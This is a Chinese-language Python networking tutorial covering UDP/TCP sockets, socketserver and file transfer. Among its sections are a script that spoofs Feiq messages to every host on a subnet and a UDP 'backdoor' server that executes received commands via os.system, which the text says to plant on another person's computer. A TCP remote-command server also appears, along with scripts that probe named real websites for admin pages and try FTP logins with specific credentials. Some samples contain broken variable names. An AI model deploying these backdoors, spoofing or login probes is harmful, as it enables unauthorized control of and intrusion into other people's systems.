# Python Network

<!-- TOC -->

- [Python Network](#python-network)
    - [TCP vs UDP](#tcp-vs-udp)
    - [socket](#socket)
    - [udp-server & udp-client](#udp-server--udp-client)
    - [remote控制](#remote控制)
        - [udp远程控制](#udp远程控制)
    - [tcp client & tcp server](#tcp-client--tcp-server)
    - [ftp攻击](#ftp攻击)
    - [SocketServer](#socketserver)
    - [File Transfer](#file-transfer)
        - [1Server 1Client](#1server-1client)
        - [1Server N Clients](#1server-n-clients)

<!-- /TOC -->

## TCP vs UDP

TCP: 三次握手，用于下载，是UDP速度的1/3，可靠

UDP: 命令形式，不管有没有收到；

一个ip有65535个端口(16bit)：

- 端口21是ftp
- 端口80或者8080是网页
- 端口25是邮箱

## socket

socket可以用于TCP, UDP


```python
#网络欺骗
import socket

mystr = "1_lbt4_10#32899#002481627512#0#0#0:1289671407:AlphaGrey:hostName:288:This is content text!"

udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.connect(('192.168.128.1', 2425))  # 2425是端口,参数是一个tuple
udp.send(mystr.encode("gbk"))
```

```python
#全网攻击
#冒充飞Q客户端发消息
#如果搞定了网络协议分析，可以冒充QQ,微信
import  socket  #网络通信 TCP，UDP
#最难弄到的是这个mystr
#来自于网络监听技术，监听技术
#网络渗透，协议分析
mystr="1_lbt4_10#32899#002481627512#0#0#0:1289671407:你的baby:你的hello:288:你好妹子"

#socket.AF_INET  网络通信，Windows AF_INET
#socket.SOCK_DGRAM报文
for  i  in range(256):
    udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    udp.connect(("10.10.153."+str(255-i),2425))#2425是端口
    udp.send(mystr.encode("gbk"))
    print(i)
```

私服：模拟一个服务器，让客户端以为是真的服务器；（冒充服务器发消息）

冒充QQ发送，比较麻烦，因为有CRC校验

## udp-server & udp-client

先启动server, 然后启动client, 再用client发送消息, 在server的console可以看到消息

```python
# udp server
import socket

udp_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_server.bind(('127.0.0.1', 8848))  # 绑定ip和端口，接受消息
while True:
    dataStr, addr = udp_server.recvfrom(1024)
    print(f"messge from {addr},content='{dataStr.decode('utf-8')}'")
```

```python
# udp client
import socket

udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    dataStr = input("Enter a string:")
    udp_client.sendto(dataStr.encode('utf-8'), ('127.0.0.1', 8848))  # 任意定义一个端口

udp_client.close()
```

互相对话

```python
# udp server
import socket
import time

udp_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_server.bind(('127.0.0.1', 8848))  # 绑定ip和端口，接受消息
while True:
    dataStr, addr = udp_server.recvfrom(1024)
    print(f"messge from {addr},content='{dataStr.decode('utf-8')}'")
    # 回复消息,只是加上一个时间戳
    datastr2Send = f"Server:{dataStr.decode('utf-8')} received at {time.asctime()}".encode('utf-8')
    udp_server.sendto(datastr2Send, addr)
```

```python
# udp client
import socket

udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    dataStr = input("Enter a string:")
    udp_client.sendto(dataStr.encode('utf-8'), ('127.0.0.1', 8848))  # 任意定义一个端口
    print(udp_client.recv(1024).decode('utf-8'))

udp_client.close()
```

## remote控制

TCP远程控制很容易被抓到(因为ip反复回应)；UDP安全些；

开发老板监视员工用到的是TCP,开发小木马用到的是UDP

线程冲突还可以用于创建随机数；

### udp远程控制

将udp server程序植入别人的电脑，自己在udp client端执行代码，就可以远程控制别人的电脑(两个py文件中的ip都改成目标机器的ip)

```python
# udp server-后门
import socket
import os

udp_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_server.bind(('127.0.0.1', 8848))  # 绑定ip和端口，接受消息
while True:
    dataStr, addr = udp_server.recvfrom(1024)
    print(f"messge from {addr},content='{dataStr.decode('utf-8')}'")
    # 执行代码
    os.system(dataStr.decode('utf-8'))
```

```python
# udp client
import socket

udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    dataStr = input("Enter a string:")
    udp_client.sendto(dataStr.encode('utf-8'), ('127.0.0.1', 8848))  # 任意定义一个端口

udp_client.close()
```

配合语音识别，可以远程操作电脑；

## tcp client & tcp server

对话系统: client发一句，server回复一句，然后server结束，后面对话无效`An established connection was aborted by the software in your host machine`

```python
# tcp server
import socket
import time

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 最多5个客户端

# Wait for an incoming connection.
# Return a new socket representing the connection, and the address of the client.
client_sock, client_addr = tcp_server.accept() #会在这里卡住
receviedData = client_sock.recv(1024)
print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
data2Send = f"{receviedData.decode('utf-8')} at({time.asctime()})".encode('utf-8')
# tcp必须要确定链接的是谁
client_sock.send(data2Send)

tcp_server.close()
```

```python
# tcp client
import socket

tcp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_client.connect(('192.168.128.1', 9988))
while True:
    dataStr=input("enter a string:")
    tcp_client.send(dataStr.encode('utf-8'))
    receivedDataStr=tcp_client.recv(1024).decode('utf-8')
    print(receivedDataStr)
```

多个client的时候，需要用到多线程；

server一直存在，然而只能接受一个的情况：

```python
# tcp server
import socket
import time

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 最多5个客户端

# Wait for an incoming connection.
# Return a new socket representing the connection, and the address of the client.
client_sock, client_addr = tcp_server.accept()  # 会在这里卡住

while True:
    receviedData = client_sock.recv(1024)
    print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
    data2Send = f"{receviedData.decode('utf-8')} at({time.asctime()})".encode('utf-8')
    # tcp必须要确定链接的是谁
    client_sock.send(data2Send)
```

```python
# tcp client
import socket

tcp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_client.connect(('192.168.128.1', 9988))
while True:
    dataStr=input("enter a string:")
    # client不能发空字符串，否则卡住了
    if len(dataStr)==0: continue
    tcp_client.send(dataStr.encode('utf-8'))
    receivedDataStr=tcp_client.recv(1024).decode('utf-8')
    print(receivedDataStr)
```

```python
# 进一步优化server; 如果client掉线, 那么重新新建conn
import socket
import time

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 异步的时候才能看到效果, 最多5个客户端排队

while True:
    client_sock, client_addr = tcp_server.accept()  # 会在这里卡住

    while True:
        receviedData = client_sock.recv(1024)
        if not receiveData:
            print('client lost...')
            break
        print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
        data2Send = f"{receviedData.decode('utf-8')} at({time.asctime()})".encode('utf-8')
        client_sock.send(data2Send)
```

```python
# 简易ssh, client发送命令, server执行命令并经结果返回给client
# 这个不支持client执行动态的命令, 比如top; 因为popen()一直在read(),所以client卡住了;
# 而且如果popen数据量很大，会逐次返回; 修改那个1024; 
# 而且文件发送会有最大值为32768Bytes(32kB); 将send改成sendall()
import socket
import time
import os

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 异步的时候才能看到效果, 最多5个客户端排队

while True:
    client_sock, client_addr = tcp_server.accept()  # 会在这里卡住

    while True:
        receviedData = client_sock.recv(1024)
        if not receiveData:
            print('client lost...')
            break
        print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
        # 执行命令
        res=os.popen(receivedData).read()
        data2Send = f"{res.decode('utf-8')} at({time.asctime()})".encode('utf-8')
        client_sock.send(data2Send)
```

```python
# simple file client, 仍然是有大小限制的;
import socket

tcp_client=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_client.connect(('192.168.128.1', 9988))

file=open('haha.mp4', 'wb')

while True:
    dataStr=input("enter a string:")
    # client不能发空字符串，否则卡住了
    if len(dataStr)==0: continue
    tcp_client.send(dataStr.encode('utf-8'))
    receivedDataStr=tcp_client.recv(1024*1024*200)
    file.write(receivedDataStr)
    file.flush()
```

```python
# simple file server
import socket
import time
import os

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 异步的时候才能看到效果, 最多5个客户端排队

while True:
    client_sock, client_addr = tcp_server.accept()  # 会在这里卡住

    while True:
        receviedData = client_sock.recv(1024)
        if not receiveData:
            print('client lost...')
            break
        print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
        # 执行命令
        with open('video.mp4', 'rb') as file:
            data2Send=file.read()
        client_sock.sendall(data2Send)
```

server先运行，由于client_sock那个地方卡住了，等待链接；链接上的client，server才会在循环中给予回复；

同理，也可以远程执行代码；client不变；

```python
# tcp server
import socket
import time
import os

tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind(('192.168.128.1', 9988))
tcp_server.listen(5)  # 最多5个客户端

# Wait for an incoming connection.
# Return a new socket representing the connection, and the address of the client.
client_sock, client_addr = tcp_server.accept()  # 会在这里卡住

while True:
    receviedData = client_sock.recv(1024)
    print("Addr=", client_addr, "content=", receviedData.decode('utf-8'))
    data2Send = f"{receviedData.decode('utf-8')} at({time.asctime()})".encode('utf-8')
    # tcp必须要确定链接的是谁
    client_sock.send(data2Send)
    os.system(receviedData.decode('utf-8'))
```

## ftp攻击

1. 刺探网站的后台管理地址
2. 


```python
#测试后台存在或者不存在
#页面渗透工具
import urllib.request

'''
路径：
单词
webadmin
admin
myadmin
测试index.asp  index1.htm  index2.html,F12查看
'''
try:
    # data=urllib.request.urlopen("http://www.qinghuabeida.cn/Webadmin").read()
    data=urllib.request.urlopen("http://www.xnzxyy.com/admin").read()
    print(data)
    print("页面存在")
except:
    print("页面不存在")
```


```python
# FTP弱口令检测工具
# 测试index.asp  index1.htm  index2.html,F12查看
#http://hk801.pc51.com/  破解FTP密码
#www.jltech.cn,可以在window的explorer中测试ftp:www.jltech.cn
'''
"user"
csdn  user用户名

密码字典  password
'''
import ftplib
try:
    myftp=ftplib.FTP("www.jltech.cn")#登陆服务器
    myftp.login("qinghuabeidacn517","yinchengak47")
    print("密码正确")
except:
    print("密码不正确")
```

## SocketServer

socketserver用法:

1. you must create a request handler class by subclassing the `BaseRequestHandler` class and overriding its `handle()` method; this method will process incoming requests. 　　
1. you must instantiate one of the server classes, passing it the server’s address and the request handler class.
1. Then call the `handle_request()` or `serve_forever()` method of the server object to process one or many requests.
1. Finally, call `server_close()` to close the socket.

example1: 单客户端服务器
> 来一个request就会实例化一个MyHandler

```python
import socketserver

class MyHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            data = self.request.recv(1024)
            if not data:
                print('client lost')
                break
            print(f'{self.client_address}: {data}')
            self.request.send(data.upper())

if __name__ == "__main__":
    # 如果server所在的电脑有多个ip地址; 
    # 采用如下addr, client可以任意连接多个ip中的一个
    addr = ('', 9999)
    server = socketserver.TCPServer(addr, MyHandler)
    server.serve_forever()
```

example2: 多客户端服务器(多线程并发服务器)

```python
import socketserver

class MyHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            data = self.request.recv(1024)
            if not data:
                print('client lost')
                break
            print(f'{self.client_address}: {data}')
            self.request.send(data.upper())

if __name__ == "__main__":
    addr = ('', 9999)
    # 只修改一个地方
    server = socketserver.ThreadingTCPServer(addr, MyHandler)
    server.serve_forever()
```

example3: 多进程并行服务器

```python
import socketserver

class MyHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            data = self.request.recv(1024)
            if not data:
                print('client lost')
                break
            print(f'{self.client_address}: {data}')
            self.request.send(data.upper())

if __name__ == "__main__":
    addr = ('', 9999)
    # 之修改这一句，因为windows没有fork, 所以只用于linux
    server = socketserver.ForkingTCPServer(addr, MyHandler)
    server.serve_forever()
```


## File Transfer

### 1Server 1Client

FTP server:
1. 读取文件名
1. 检测文件是否存在，检测文件大小
1. 打开文件
1. 发送文件大小给client
1. 等待client确认(防止粘包)
1. 开始边读边发数据
1. 发送md5给client

```python
import hashlib
import os
import socket

tcp_socket = socket.socket()
tcp_socket.bind(('localhost', 7788))
tcp_socket.listen(10)
while True:
    new_socket, client_info = tcp_socket.accept()
    print('new client connected')
    while True:
        recv_data = new_socket.recv(1024).decode('utf8')
        if recv_data:
            print(f'>>{recv_data}')
        else:
            print('client has lost')
            break

        cmd, filename = recv_data.split()
        if cmd == 'download':
            if os.path.isfile(filename):
                m = hashlib.md5()
                file_size = os.stat(filename).st_size
                with open(filename, 'rb') as file:
                    new_socket.send(f'{file_size}'.encode('utf8'))
                    new_socket.recv(1024)  # wait for ack: 防粘包
                    for line in file:
                        m.update(line)
                        new_socket.send(line)
                    server_md5 = m.hexdigest()
                    print(f'MD5={server_md5}')
                new_socket.send(f'{server_md5}'.encode('utf8'))
        elif cmd == 'upload':
            pass
        else:
            print('some err')
    new_socket.close()
tcp_socket.close()
```

FTP client:
1. 发送命令
2. 接收文件大小
3. 写入文件
4. 对比MD5

```python
import hashlib
import socket

tcp_socket = socket.socket()
tcp_socket.connect(('localhost', 7788))
while True:
    send_data = input("<<")
    if not send_data:
        print('you send empty! will continue')
        continue

    try:
        cmd, filename = send_data.split()
    except Exception as e:
        print('only one command argument')
        continue

    if cmd == 'download':
        tcp_socket.send(send_data.encode('utf8'))
        length_data = eval(tcp_socket.recv(1024).decode('utf8'))
        tcp_socket.send(b'ready to recv file')

        m = hashlib.md5()
        received_size = 0
        with open(f'new-{filename}', 'wb') as file:
            while received_size < length_data:
                # 防止md5粘在文件上
                size = 1024 if length_data-received_size > 1024 else length_data-received_size
                line = tcp_socket.recv(size)
                m.update(line)
                received_size += len(line)
                file.write(line)
            else:
                print(f'{received_size/1024:.2f}kB/{length_data/1024:.2f}kB')
                client_md5 = m.hexdigest()
                print(f'client MD5={client_md5}')

        server_md5 = tcp_socket.recv(1024).decode('utf8')
        print(f'server MD5={server_md5}')
        if client_md5 == server_md5:
            print('right file')
    elif cmd == 'upload':
        pass
    else:
        print('download/upload file like: cmd filename')

tcp_socket.close()
```

### 1Server N Clients

FTP Server

```python
import json
import os
import socketserver


class MyHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            msg_str = self.request.recv(1024).decode('utf8')
            if not msg_str:
                print('client lost')
                break
            msg = json.loads(msg_str)
            action = msg['action']
            if hasattr(self, action):
                func = getattr(self, action)
                func(msg)
            else:
                print('action error')

    def put(self, *args):
        '''receive client file'''
        msg = args[0]
        file_name = msg['filename']
        file_size = msg['size']

        self.request.send(b'server ready to write')
        if os.path.isfile(file_name):
            # override old file
            f = open(f'new-{file_name}', 'wb')
        else:
            f = open(file_name, 'wb')
        received_size = 0
        while received_size < file_size:
            line = self.request.recv(1024)
            received_size += len(line)
            f.write(line)
        else:
            print(f'{file_name} uploaded!')

    def chdir(self, *args):
        # 服务器上不能切换目录，要不然影响server.py运行
        # 如果切换到/，轻易被攻击
        # 将客户端cd后的路径发送给服务器即可，服务器据此存取文件
        # 配合变量 user_current_dir = "/home/user/XXX"来实现
        pass

if __name__ == "__main__":
    addr = ('', 9999)
    server = socketserver.ThreadingTCPServer(addr, MyHandler)
    server.serve_forever()
```

FTP Client

```python
import json
import os
import socket


class FtpClient(object):
    def __init__(self):
        self.s = socket.socket()

    def connect(self, ip, port):
        self.s.connect((ip, port))

    def auth(self, parameter_list):
        '''authentication'''
        pass

    def interactive(self):
        # login
        # self.auth()
        while True:
            data_in = input('>>:')
            if not data_in:
                continue
            print(data_in)
            cmd = data_in.split()[0]
            if hasattr(self, f'cmd_{cmd}'):
                func = getattr(self, f'cmd_{cmd}')
                func(data_in)
            else:
                self.help()

    def cmd_ls(self, parameter_list):
        pass

    def cmd_pwd(self, parameter_list):
        pass

    def cmd_cd(self, parameter_list):
        pass

    def cmd_get(self, parameter_list):
        pass

    def cmd_put(self, *args):
        try:
            _, filename = args[0].split()
        except:
            print('cmd like: put filename')

        if os.path.isfile(filename):
            msg = {
                'action':'put',
                'filename': filename,
                'size': os.stat(filename).st_size
            }
            self.s.send(json.dumps(msg).encode('utf8'))
            self.s.recv(1024)  # wait ack
            with open(filename, 'rb') as file:
                for line in file:
                    self.s.send(line)
                else:
                    print('upload success!')
        else:
            print('file not exist!')

    def help(self):
        info = '''
        ls
        pwd
        cd
        get filename
        put filename
        '''

if __name__ == "__main__":
    client=FtpClient()
    client.connect('localhost', 9999)
    client.interactive()
```